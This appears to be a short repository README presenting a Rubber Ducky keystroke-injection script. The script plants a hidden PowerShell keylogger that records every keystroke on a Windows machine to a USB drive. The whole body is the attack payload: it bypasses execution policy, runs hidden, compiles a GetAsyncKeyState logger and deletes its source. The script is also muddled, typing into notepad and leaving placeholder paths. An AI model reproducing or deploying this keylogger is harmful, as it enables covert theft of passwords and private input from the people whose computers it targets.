# rubberduckykeylog
This Rubber Ducky Script save all keyboard touch in your choosen path 



DELAY 1000

REM ----- Rubber Ducky Keylogger -----

REM ----- Autorun -----

WINDOWS + R

DELAY 500

STRING notepad

ENTER

DELAY 500

STRING start /MIN powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "$usbPath = Get-WmiObject Win32_Volume | ? { $_.Label -eq 'YOUR_USB_LABEL' } | Select-Object -ExpandProperty Name; $logFile = $usbPath + '\keylogs.txt'; Add-Type -TypeDefinition 'using System; using System.IO; using System.Windows.Forms; using System.Diagnostics; using System.Runtime.InteropServices; public class KeyLogger { [DllImport(\"user32.dll\")] public static extern int GetAsyncKeyState(Int32 i); public static void Main() { StreamWriter sw = new StreamWriter(File.Create(@\"' + $logFile + '\")); while (true) { for (Int32 i = 0; i < 255; i++) { int keyState = GetAsyncKeyState(i); if (keyState == 1 || keyState == -32767) { sw.Write((Keys)i + \",\"); } } } } }'; $sourceCode = @(' + '"' + 'YOUR_SOURCE_CODE_HERE' + '"' + '); $sourceCode = $sourceCode.Replace(' + '"' + '\\"' + '"' + ', ' + '"' + '"' + '); File.WriteAllText(' + '"' + 'YOUR_SOURCE_CODE_PATH' + '"' + ', $sourceCode); (New-Object System.Diagnostics.ProcessStartInfo -Property @{ FileName = ' + '"' + 'YOUR_COMPILER_PATH' + '"' + '; Arguments = ' + '"' + 'YOUR_SOURCE_CODE_PATH' + '"' + '; CreateNoWindow = $true; UseShellExecute = $false; }).Start(); Start-Sleep -Seconds 2; Remove-Item ' + '"' + 'YOUR_SOURCE_CODE_PATH' + '"' + ';' >C:\keylogger.txt

ENTER

DELAY 500

ALT F4

DELAY 500

STRING exit

ENTER

